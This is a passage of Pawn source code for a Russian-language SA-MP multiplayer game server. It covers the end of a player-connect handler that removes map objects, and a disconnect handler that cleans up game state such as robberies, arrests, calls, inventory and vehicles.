	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1021.6875, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1941.0234, 1014.2266, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1939.6953, 1014.2188, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1941.0234, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1939.6953, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1941.8438, 1029.1328, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1940.5547, 1029.4766, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1942.1250, 1006.5703, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1940.8828, 1006.1094, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 1895, 1940.6875, 989.1719, 992.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1940.8828, 1006.1094, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1941.5234, 1006.3828, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1942.1250, 1006.5703, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 1895, 1943.2188, 986.5234, 992.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1939.6953, 1014.2188, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1940.3906, 1014.2031, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1941.0234, 1014.2266, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1939.6953, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1940.3906, 1021.4141, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1941.0234, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.4453, 987.6719, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.7188, 987.1953, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1959.3984, 1010.1172, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1960.3672, 1015.6641, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2773, 1960.3047, 1017.9219, 992.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1960.3672, 1020.1719, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2773, 1961.3516, 1021.4297, 992.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2773, 1961.3750, 1014.3672, 992.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1961.9609, 992.2031, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1962.4063, 991.8750, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1962.3438, 1015.6641, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2773, 1962.3750, 1017.9219, 992.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1962.3438, 1020.1797, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1964.5703, 998.4531, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1965.1016, 998.3047, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1963.7109, 1010.1172, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1968.0938, 1006.3594, 993.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1968.0938, 1013.9844, 993.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1968.0938, 1021.6797, 993.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1021.6875, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1021.6875, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1940.5547, 1029.4766, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1941.2188, 1029.2969, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1941.8438, 1029.1328, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1959.3984, 1025.6953, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1963.7109, 1025.6953, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1029.6563, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1968.0938, 1029.5391, 993.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1029.6641, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1964.5469, 1037.2813, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1965.0938, 1037.3516, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1961.9219, 1043.3594, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1962.3984, 1043.6328, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.3203, 1047.9766, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.6563, 1048.4141, 992.9844, 0.25);


	//== BIKERS
	RemoveBuildingForPlayer(playerid, 3301, -216.8750, 2770.1484, 63.5703, 0.25);
	RemoveBuildingForPlayer(playerid, 3301, -282.2266, 2719.2578, 63.5703, 0.25);
	RemoveBuildingForPlayer(playerid, 3300, -264.0234, 2766.4063, 62.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 3300, -166.1328, 2731.0859, 63.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3299, -195.6016, 2768.7578, 61.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 3299, -314.1875, 2720.6406, 62.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3298, -258.8438, 2786.1484, 62.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 3298, -165.3906, 2708.1016, 62.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 3297, -229.2500, 2809.9453, 62.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3297, -147.7891, 2684.8125, 63.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3345, -167.6797, 2767.1328, 61.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 3343, -154.5547, 2761.0078, 61.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 3342, -275.1797, 2738.4844, 61.3047, 0.25);
	RemoveBuildingForPlayer(playerid, 3341, -289.7422, 2758.2344, 61.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 16761, -312.2422, 2646.3750, 62.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 16762, -327.6094, 2678.5469, 61.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 16763, -279.7188, 2650.2109, 61.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 16764, -288.8359, 2682.4297, 61.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 16765, -227.4531, 2716.3516, 62.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 16012, -264.6719, 2596.5703, 61.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 955, -253.7422, 2597.9531, 62.2422, 0.25);
	RemoveBuildingForPlayer(playerid, 956, -253.7422, 2599.7578, 62.2422, 0.25);
	RemoveBuildingForPlayer(playerid, 16399, -312.2422, 2646.3750, 62.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 16398, -279.7188, 2650.2109, 61.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 16402, -318.2891, 2650.2422, 69.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 16401, -271.9688, 2662.1953, 61.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 16776, -237.0234, 2662.8359, 62.6094, 0.25);
	RemoveBuildingForPlayer(playerid, 1340, -197.4922, 2659.9141, 62.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 16062, -222.6641, 2663.3047, 66.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 16063, -222.3438, 2663.4531, 71.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -206.6328, 2672.2422, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -278.9688, 2679.0234, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 16400, -327.6094, 2678.5469, 61.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 16396, -288.8359, 2682.4297, 61.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -156.0234, 2675.2031, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 672, -243.0313, 2688.3047, 62.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -356.8438, 2707.4219, 62.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 3284, -282.2266, 2719.2578, 63.5703, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -333.5703, 2719.3516, 61.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 3283, -314.1875, 2720.6406, 62.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 672, -240.8359, 2737.1484, 62.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 3173, -275.1797, 2738.4844, 61.3047, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -269.6953, 2750.4609, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3170, -289.7422, 2758.2344, 61.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -297.8047, 2755.1875, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3285, -264.0234, 2766.4063, 62.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 3241, -258.8438, 2786.1484, 62.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 672, -245.3125, 2781.4922, 62.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -232.1641, 2685.2734, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -202.5703, 2687.9688, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 16011, -227.4531, 2716.3516, 62.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3284, -216.8750, 2770.1484, 63.5703, 0.25);
	RemoveBuildingForPlayer(playerid, 3283, -195.6016, 2768.7578, 61.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 672, -213.2891, 2787.9297, 61.9219, 0.25);
	RemoveBuildingForPlayer(playerid, 3242, -229.2500, 2809.9453, 62.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -211.9609, 2805.6641, 61.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 3241, -165.3906, 2708.1016, 62.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 3285, -166.1328, 2731.0859, 63.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -164.1641, 2754.7656, 61.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -168.4844, 2740.5547, 61.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 3172, -167.6797, 2767.1328, 61.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -174.5547, 2769.4609, 61.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 3168, -154.5547, 2761.0078, 61.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 3242, -147.7891, 2684.8125, 63.2188, 0.25);
	// === heal
	RemoveBuildingForPlayer(playerid, 937, 2543.0781, -1304.5000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1250, -1304.5000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2543.0781, -1302.5625, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2543.0703, -1301.0000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1250, -1302.5625, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2551.1172, -1301.0000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1016, -1304.5000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1016, -1302.5625, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2559.0938, -1301.0000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 934, 2543.1953, -1293.4141, 1044.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 934, 2553.4375, -1293.4141, 1044.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 934, 2558.6875, -1293.4141, 1044.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2577.8516, -1291.4063, 1043.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2543.1016, -1286.3125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2543.1250, -1284.7500, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2543.1250, -1282.8125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1016, -1282.8125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1016, -1284.7500, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2551.1016, -1286.3125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2559.1250, -1286.3125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1094, -1284.7500, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1094, -1282.8125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2577.8359, -1288.3984, 1043.1172, 0.25);
	// == army
	//==
	//RemoveBuildingForPlayer(playerid, 5882, 1316.5781, -984.7891, 86.8906, 0.25);
//	RemoveBuildingForPlayer(playerid, 5884, 1316.5781, -984.7891, 86.8906, 0.25);



		//Remove Buildings///////////////////////////////////////////////////////////////////////////////////////////////
	
	CheckBanList(playerid);

	//
	
	//

	//
	
	//





	

	

	
	RemoveBuildingForPlayer(playerid, 5024, 1748.8438, -1883.0313, 14.1875, 0.25);
	//armarka
	RemoveBuildingForPlayer(playerid, 13192, 164.7109, -234.1875, 0.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 13193, 173.5156, -323.8203, 0.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 13194, 140.5938, -305.3906, 5.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 13195, 36.8281, -256.2266, 0.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 12861, 36.8281, -256.2266, 0.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 12859, 173.5156, -323.8203, 0.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 13198, 140.5938, -305.3906, 5.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 12956, 96.3281, -261.1953, 3.8594, 0.25);
	RemoveBuildingForPlayer(playerid, 12860, 164.7109, -234.1875, 0.4766, 0.25);

	//ammo
	//
	///
	RemoveBuildingForPlayer(playerid, 968, -1526.4375, 481.3828, 6.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 966, -1526.3906, 481.3828, 6.1797, 0.25);
	//RemoveBuildingForPlayer(playerid, 16094, 191.1406, 1870.0391, 21.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 12932, -117.9609, -337.4531, 3.6172, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, 347.1953, 1799.2656, 18.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, 342.9375, 1796.2891, 18.7578, 0.25);
	

    PriceText = CreatePlayerTextDraw(playerid, 457.000000, 192.062500, "COST: $100000");
	PlayerTextDrawLetterSize(playerid,PriceText, 0.449999, 1.600000);
	PlayerTextDrawAlignment(playerid,PriceText, 1);
	PlayerTextDrawColor(playerid,PriceText, -1);
	PlayerTextDrawSetShadow(playerid,PriceText, 0);
	PlayerTextDrawSetOutline(playerid,PriceText, 1);
	PlayerTextDrawBackgroundColor(playerid,PriceText, 51);
	PlayerTextDrawFont(playerid,PriceText, 2);
	PlayerTextDrawSetProportional(playerid,PriceText, 1);



	


	CheckSMS[playerid] = -1;
	BigEar[playerid] = 0;
	CheckF[playerid] = 0;
	tp__ignore_tick[playerid] = GetTickCount()+999999999;
	gun__ignore_tick[playerid] = GetTickCount()+999999999;
 	PlayerLogTries[playerid] = 0;
	player__kill{playerid} = 0;
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	if(playerid == npcid) ConnectNPC("MyFirstNPC","mynpc");
    if(admincar[playerid][0]) DestroyVehicle(admincar[playerid][0]), admincar[playerid][0] = 0;
    if(GetPVarInt(playerid,"CarRob"))
	{
		new i = GetPVarInt(playerid,"CarRob")-1;
		SetVehicleVirtualWorld(CarRob[i],18);
		GangZoneHideForPlayer(playerid,CarRobGz[i]);
		DeletePVar(playerid,"CarRob");
		DeletePVar(playerid,"CarRobW");
		DeletePVar(playerid,"RobCarTime");
	}
    if(GetPVarInt(playerid,"Cops"))
	{
		DeletePVar(GetPVarInt(playerid,"CopsID"),"AttachPlayer");
		SendClientMessage(GetPVarInt(playerid,"CopsID"),CGREY,"Вы упустили преступника!");
		DeletePVar(playerid,"Cops");
		DeletePVar(playerid,"CopsID");

	}
	if(PlayerInfo[playerid][pGrabTeam] && BankGrab[PlayerInfo[playerid][pGrabTeam]][bGrab])
	{
		SendBandMes(PlayerInfo[playerid][pGrabTeam],CREWARD,"Ограбление провелено! Причина: Игрок вышел из игры");
		ClearBank(PlayerInfo[playerid][pGrabTeam],BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown]);
		ClearBand(PlayerInfo[playerid][pGrabTeam]);
	}
	if(PlayerInfo[playerid][pGrabTeam])
	{
	    if(GetPVarInt(playerid,"GrabQuest"))
		{
		    if(IsValidDynamicPickup(GetPVarInt(playerid,"GrabQuestP"))) DestroyDynamicPickup(GetPVarInt(playerid,"GrabQuestP")),DeletePVar(playerid,"GrabQuestP");
			BankGrab[PlayerInfo[playerid][pGrabTeam]][bQuest][GetPVarInt(playerid,"GrabQuest")] = 0;
		}
	}
	if(GetPVarInt(playerid,"InJob") == 1)
	{
		DestroyDynamicCP(GetPVarInt(playerid,"JobCP"));
		DeletePVar(playerid,"JobCP");
		DeletePVar(playerid,"InJob");
	}
	if(GetPVarInt(playerid,"STO"))
	{
	    for(new i = 0; i < 33; i++) TextDrawShowForPlayer(playerid,Tuning[i]);
	    for(new i = 0; i < 14; i++) PlayerTextDrawDestroy(playerid,TuningP[i][playerid]);
	}
	if(GetPVarInt(playerid,"Cont"))
	{
	    for(new i = 0; i < 10; i++) PlayerTextDrawDestroy(playerid,AuctionP[playerid][i]);
		for(new i = 0; i < 22; i++) TextDrawHideForPlayer(playerid,Auction[i]);
		TogglePlayerSpectating(playerid,false);
        CancelSelectTextDraw(playerid);
		DeletePVar(playerid,"ContW");
		DeletePVar(playerid,"Cont");
	}
    if(GetPVarInt(playerid,"CameraOn"))
	{
		DeletePVar(playerid,"CameraOn");
		for(new gSL; gSL < 2; gSL++) PlayerTextDrawDestroy(playerid, CameraP[gSL][playerid]);
		for(new gSL; gSL < 27; gSL++) TextDrawHideForPlayer(playerid, Camera[gSL]);
		PlayerTextDrawDestroy(playerid,InfoText[playerid]);
		for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
	}
	if(GetPVarInt(playerid,"InvOpen")) CloseInv(playerid);
    else if(GetPVarInt(playerid,"OpenHouse") || GetPVarInt(playerid,"OpenTrunk") || GetPVarInt(playerid,"OpenTorg"))
    {
        if(GetPVarInt(playerid,"OpenHouse")) SaveHouseInv(GetPVarInt(playerid,"PlayerHouse"));
	    DeletePVar(playerid,"OpenHouse");
	    DeletePVar(playerid,"OpenTorg");
	    DeletePVar(playerid,"OpenTrunk");
	    DeletePVar(playerid,"SetCehck");
		for(new i = 0; i < 16; i++)
		{
	 		if(i < 15) TextDrawHideForPlayer(playerid,Inventory[i]);
	 		TextDrawHideForPlayer(playerid,Inventory1[i]);
		}
		TextDrawHideForPlayer(playerid,Inventory[22]);
		for(new i = 0; i < 36; i++)
		{
		    PlayerTextDrawDestroy(playerid,InventoryP1[i][playerid]);
			PlayerTextDrawDestroy(playerid,InventoryP[i][playerid]);
			PlayerTextDrawDestroy(playerid,InvAmm[playerid][i]);
			PlayerTextDrawDestroy(playerid,InvAmm1[playerid][i]);
		}
	 	CancelSelectTextDraw(playerid);
	 	return 1;
    }
	Uncuff(playerid);
	if(GetPVarInt(playerid,"FBICAR"))
	{
	    new car = GetPVarInt(playerid,"FBICAR");
	    SetVehicleVirtualWorld(FBICars[car],20);
	    FBIStatus[car] = false;
	    DeletePVar(playerid,"FBICAR");
	}
	if(GetPVarInt(playerid,"AttachPlayer"))
	{
	    new pl = GetPVarInt(playerid,"AttachPlayer")-1;
	    DeletePVar(playerid,"AttachPlayer");
		DeletePVar(pl,"Cops");
		DeletePVar(pl,"CopsID");
		TogglePlayerControllable(pl, 1);
		SendClientMessage(playerid,CGREY,"Вы упустили преступника!");
		SendClientMessage(pl,CGREY,"Сотрудник упустил Вас!");
	}
    if(GetPVarInt(playerid,"KomGG") && InGameGG)
	{
		if(IsValidDynamicArea(GetPVarInt(playerid,"AreaSK"))) DestroyDynamicArea(GetPVarInt(playerid,"AreaSK")),DeletePVar(playerid,"AreaSK");
		DeletePVar(playerid,"AntiSK");
		KolvIgGG--;
		ResetPlayerWeapons(playerid);
	}
	if(furniture_pickup[playerid] != -1) DestroyDynamicPickup(furniture_pickup[playerid]),furniture_pickup[playerid] = -1;
	if(GetPVarInt(playerid,"Tir") > 0)
	{
		shot__player[playerid] = 0;
		PlayerTextDrawDestroy(playerid,InfoText[playerid]);
		for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
		levelammo[playerid] = 0;
		DeletePVar(playerid,"Tir");
		DeletePVar(playerid,"AmmoV");
		DeletePVar(playerid,"short__shop");
		ResetPlayerWeapons(playerid);
		DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir1"));
		DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir2"));
		DeletePVar(playerid,"ObjectTir1");
		DeletePVar(playerid,"ObjectTir2");
	}
	if(GetPVarInt(playerid,"InDog"))
	{
     	for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !GetPVarInt(i,"InDog") || i == playerid) continue;
	        DestroyDynamic3DTextLabel(DogText);
			DogText = CreateDynamic3DTextLabel("Ведущий",0xFF0000FF,0.0,0.0,0.5,5.0,i,INVALID_VEHICLE_ID,1, 11);
			DogVed = i;
			DogVedPred = INVALID_PLAYER_ID;
			GameTextForPlayer(i, "~r~YOU ARE LEADING", 5000, 4);
		}
	}

	if(GetPVarInt(playerid,"Kick1") == 0)
	{
		if(GetPVarInt(playerid,"Jail") > 0 || (GetPVarInt(playerid,"TimeCuff") && PlayerInfo[playerid][pWanted]))
 	   	{
		    PlayerInfo[playerid][pJail] = 1;
		    PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pWanted]*60*6;
		    PlayerInfo[playerid][pJailTime] += 1800;
		    PlayerInfo[playerid][pWanted] = 0;
		    PlayerInfo[playerid][pAr]++;
	    }
	    if(PlayerInfo[playerid][pWanted] > 0)
	    {
	        new Float:x,Float:y,Float:z;
	        for(new i = 0; i < MAX_PLAYERS; i++)
	        {
	            if(!IsPlayerConnected(i) || PlayerLogged[i] == false || PlayerInfo[i][pMember] != F_LVPD) continue;
				GetPlayerPos(i,x,y,z);
				if(!IsPlayerInRangeOfPoint(playerid, 20.0, x,y,z)) continue;
				PlayerInfo[playerid][pJail] = 1;
			    PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pWanted]*60*6;
			    PlayerInfo[playerid][pJailTime] += 1800;
			    PlayerInfo[playerid][pWanted] = 0;
			    PlayerInfo[playerid][pAr]++;
			    break;
	        }
	    }
		new Float:x,Float:y,Float:z,Float:a;
		GetPlayerPos(playerid,x,y,z);
		GetPlayerFacingAngle(playerid,a);
		if(x != 0.0 && !GetPlayerInterior(playerid) && !GetPlayerVirtualWorld(playerid))
		{
			format(PlayerInfo[playerid][pVPos],70,"%.1f,%.1f,%.1f,%.1f",x,y,z,a);
			SetPlayerStr(PlayerInfo[playerid][pSendername],"vhodpos",PlayerInfo[playerid][pVPos]);
			SetPlayerInt(PlayerInfo[playerid][pSendername],"vhodint",gettime()+60*5);
		}
		else SetPlayerInt(PlayerInfo[playerid][pSendername],"vhodint",gettime());
	    SaveAccount(playerid);
    }
    DeletePVar(playerid,"AmmoTimer");
    if(GetPVarInt(playerid,"Zvon") > 0 || GetPVarInt(playerid,"ZvonStudio") > 0 || GetPVarInt(playerid,"Razgovor") > 0)
    {
        if(GetPVarInt(GetPVarInt(playerid,"ZvonID"),"Zvonit") == 0) return SendClientMessage(playerid,CGREY,"Игрок вам не звонил");
	    SendClientMessage(playerid,CREWARD,"Вы сбросили звонок");
	    SendClientMessage(GetPVarInt(playerid,"ZvonID"),CREWARD,"Игрок сбросил звонок");
	   	new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
		SetPVarFloat(playerid,"PhoneX",x);
		SetPVarFloat(playerid,"PhoneY",y);
		SetPVarFloat(playerid,"PhoneZ",z);
	    if(GetPVarInt(playerid,"Razgovor") > 0)
	    {
		    SetPlayerSpecialAction(playerid, 0);
		    if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
		    DeletePVar(GetPVarInt(playerid,"ZvonID"),"Razgovor");
		    DeletePVar(playerid,"Razgovor");
	    }
	    if(GetPVarInt(playerid,"ZvonStudio") > 0)
	    {
			static const fmt_string[] = "[R] %s сбросил вызов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
			format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername]);
			SendFMes(F_NEWS,COLOR_SKLAD,str);
			DeletePVar(playerid,"ZvonStudio");
			DeletePVar(playerid,"EfirZvon");
	    }
	    SetPlayerSpecialAction(GetPVarInt(playerid,"ZvonID"), 0);
	    if(IsPlayerAttachedObjectSlotUsed(GetPVarInt(playerid,"ZvonID"), 2)) RemovePlayerAttachedObject(GetPVarInt(playerid,"ZvonID"), 2);
	    DeletePVar(playerid,"Zvon");
	    DeletePVar(GetPVarInt(playerid,"ZvonID"),"ZvonID");
	    DeletePVar(GetPVarInt(playerid,"ZvonID"),"Zvonit");
		return DeletePVar(playerid,"ZvonID");
	}
    if(Trenag[playerid]) EndKach(playerid,Trenag[playerid]);
 
    for(new k = 1; k<=TOTALV; k++)
	{
	    if(VInfo[k][vcar] == INVALID_VEHICLE_ID) continue;
		if(strcmp(VInfo[k][vname], PlayerInfo[playerid][pSendername], true) == 0)
		{
		    if(VInfo[k][vobj1])
			{
			    DestroyDynamic3DTextLabel(CarLable[VInfo[k][vcar]]);
				DestroyDynamicObject(VInfo[k][vobj1]);
				VInfo[k][vobj1] = 0;
			}
			SetVehicleVirtualWorld(VInfo[k][vcar],30);
			

		}
	}
	for(new i = 0;i <= 2;i++) PlayerTextDrawDestroy(playerid,CaptPl[playerid][i]);
	if(PlayerInfo[playerid][pObjectSp]) DestroyDynamicArea(PlayerInfo[playerid][pObjectSp]);
   	for(new i = 0; i <= 4; i++)
 	{
	    if(!PlayerInfo[playerid][pObject][i]) continue;
		DestroyDynamicObject(PlayerInfo[playerid][pObject][i]);
		DestroyDynamic3DTextLabel(PlayerInfo[playerid][pLable][i]);
	}
	if(GetPVarInt(playerid,"RentCar") > 0)
    {
       	RentCar[GetPVarInt(playerid,"RentCar")] = -1;
       	Locked[GetPVarInt(playerid,"RentCar")] = -1;
       	SetVehicleToRespawn(GetPVarInt(playerid,"RentCar"));
		DeletePVar(playerid,"RentCar");
    }
    if(GetPVarInt(playerid,"Spec"))
    {
        for(new i = 0; i <= 25; i++) TextDrawHideForPlayer(playerid,AdminPanel[i]);
		for(new i = 0; i <= 2; i++) PlayerTextDrawDestroy(playerid,AdminPanelP[i][playerid]);
    }
    if(GetPVarInt(playerid,"Stol") > 0)
    {
        for(new x = 0; x < 3; x++) TextDrawHideForPlayer(playerid,CasinoTD[GetPVarInt(playerid,"Stol")][x]);
		for(new x = 0; x < 21; x++) TextDrawHideForPlayer(playerid,Casino[x]);
		UpdateStol(GetPVarInt(playerid,"Stol"));
		StolInfo[GetPVarInt(playerid,"Stol")][sPlayer][GetPVarInt(playerid,"StolID")] = -1;
		StolInfo[GetPVarInt(playerid,"Stol")][sDice][GetPVarInt(playerid,"StolID")] = 0;
    }
    printf("stol");
    for(new i; i<MAX_PLAYER_ATTACHED_OBJECTS; i++)
    {
        if(IsPlayerAttachedObjectSlotUsed(playerid, i)) RemovePlayerAttachedObject(playerid, i);
    }
    PlayerLogged[playerid] = false;
    KillTimer(player__timer[playerid]);
    if(PlayerInfo[playerid][pAdmin] > 0)
